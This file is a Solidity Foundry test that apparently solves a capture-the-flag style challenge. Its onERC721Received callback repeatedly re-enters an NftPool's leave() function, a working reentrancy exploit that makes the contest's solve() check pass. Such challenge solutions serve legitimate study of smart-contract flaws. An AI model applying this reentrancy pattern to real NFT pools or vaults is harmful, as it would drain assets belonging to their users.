// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {EnumNft, NftPool, Contest} from "../src/NFTPool.sol";

contract NFTPoolTest is Test {
    EnumNft public nft;
    NftPool public nftPool;
    Contest public contest;
    uint256 replayAmount = 0;
    bool isInit = false;

    function setUp() public {
        contest = new Contest();
        contest.init();
        isInit = true;
    }

    function testAttack() public {
        uint256 tokenId = contest.tokenId();
        address addr = address(contest.nftPool());

        contest.nft().approve(address(contest.nftPool()), tokenId);
        contest.nftPool().enter(tokenId);
        contest.nftPool().leave(tokenId);
        assertEq(contest.solve(), true);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes memory
    ) external returns (bytes4) {
        if (!isInit) {
            return this.onERC721Received.selector;
        }

        if (replayAmount < 1001) {
            contest.nft().safeTransferFrom(
                address(this),
                address(contest.nftPool()),
                1
            );

            contest.nftPool().leave(tokenId);
            replayAmount++;
        }
        return this.onERC721Received.selector;
    }
}
